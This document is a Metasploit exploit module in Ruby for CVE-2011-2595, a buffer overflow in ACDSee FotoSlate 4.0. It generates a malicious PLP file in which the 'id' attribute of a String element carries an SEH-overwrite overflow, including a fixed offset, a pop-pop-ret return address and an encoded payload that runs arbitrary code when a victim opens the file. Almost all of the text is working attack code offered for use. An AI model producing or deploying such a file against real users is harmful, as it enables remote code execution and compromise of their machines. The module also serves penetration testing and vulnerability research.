##
# $Id: acdsee_fotoslate_string.rb 13853 2011-10-10 16:47:33Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ACDSee FotoSlate PLP File id Parameter Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in ACDSee FotoSlate 4.0 Build 146 via
				a specially crafted id parameter in a String element.  When viewing a malicious
				PLP file with the ACDSee FotoSlate product, a remote attacker could overflow a
				buffer and execute arbitrary code. This exploit has been tested on systems such as
				Windows XP SP3, Windows Vista, and Windows 7.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Parvez Anwar', # Vulnerability discovery
					'juan vazquez'  # Metasploit module
				],
			'Version'        => '$Revision: 13853 $',
			'References'     =>
				[
					[ 'CVE', '2011-2595' ],
					[ 'OSVDB', '75425' ],
					[ 'BID', '49558' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true'
				},
			'Payload'        =>
				{
					#'Space'    => 4000,
					'BadChars' => "\x00\x22"
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[
						'ACDSee FotoSlate 4.0 Build 146',
						{
							'Ret'         => 0x263a5b57, # pop, pop, ret from ipwssl6.dll
							'Offset'      => 1812,
							'TotalLength' => 5000
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Sep 12 2011',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.plp']),
			], self.class)
	end

	def exploit

		overflow = rand_text(target["Offset"])
		overflow << generate_seh_record(target.ret)
		overflow << payload.encoded
		overflow << rand_text_alpha(target["TotalLength"] - overflow.length)

		plp =<<TEMPLATE
<?xml version="1.0" encoding="ISO-8859-1"?>
<ACDFotoSlateDocument15>
<PageDefinition>
<Template>
<Version>3.0</Version>
<Page>
<Name>Letter</Name>
<Properties>
<String id="#{overflow}"></String>
<String id="Width">8.500000IN</String>
<String id="Height">11.000000IN</String>
<String id="Orientation">Portrait</String>
<Bool id="AutoRotate">FALSE</Bool>
<Bool id="AutoFill">FALSE</Bool>
</Properties>
<Content>
<Bool id="UseBGColor">FALSE</Bool>
<Int id="BGImageType">0</Int>
<String id="BGImageFile"></String>
<Int id="BGColor">16777215</Int>
</Content>
</Page>
<ToolList>
<Group>
<Tool>
<Name>Image</Name>
<Properties>
<String id="XPos">0.500000IN</String>
<String id="YPos">0.500000IN</String>
<String id="Width">7.500000IN</String>
<String id="Height">10.000000IN</String>
<Float id="Tilt">0.000000</Float>
</Properties>
<Content>
<Int id="ShapeType">0</Int>
<Float id="RoundRectX">0.000000</Float>
<Float id="RoundRectY">0.000000</Float>
<Bool id="ShrinkToFit">FALSE</Bool>
<Bool id="AutoRotate">FALSE</Bool>
<Float id="BorderWidth">0.000000</Float>
<Bool id="UseBGColor">FALSE</Bool>
<Int id="BGColor">8454143</Int>
<Bool id="DropShadow">FALSE</Bool>
<Int id="DSColor">0</Int>
<Bool id="BevelEdge">FALSE</Bool>
<Bool id="Border">FALSE</Bool>
<Int id="BorderColor">16711680</Int>
<Bool id="IsLocked">FALSE</Bool>
</Content>
</Tool>
</Group>
</ToolList>
</Template>
<PageContent>
<Version>3.0</Version>
<Page>
<Name>Letter</Name>
<Content>
<Bool id="UseBGColor">FALSE</Bool>
<Int id="BGImageType">0</Int>
<String id="BGImageFile"></String>
<Int id="BGColor">16777215</Int>
</Content>
</Page>
<ToolList>
<Group>
<Tool>
<Name>Image</Name>
<Content>
<Int id="ShapeType">0</Int>
<Float id="RoundRectX">0.000000</Float>
<Float id="RoundRectY">0.000000</Float>
<Bool id="ShrinkToFit">FALSE</Bool>
<Bool id="AutoRotate">FALSE</Bool>
<Float id="BorderWidth">0.000000</Float>
<Bool id="UseBGColor">FALSE</Bool>
<Int id="BGColor">8454143</Int>
<Bool id="DropShadow">FALSE</Bool>
<Int id="DSColor">0</Int>
<Bool id="BevelEdge">FALSE</Bool>
<Bool id="Border">FALSE</Bool>
<Int id="BorderColor">16711680</Int>
<Bool id="IsLocked">FALSE</Bool>
</Content>
</Tool>
</Group>
</ToolList>
</PageContent>
</PageDefinition>
</ACDFotoSlateDocument15>
TEMPLATE

		print_status("Creating '#{datastore['FILENAME']}' file ...")
		file_create(plp)
	end

end


=begin
After SEH, we have ~0x23C3 bytes (9155 in decimal) of space for payload. But we need to avoid
using a long buffer in order to avoid the meterpreter possibly being broken.
=end
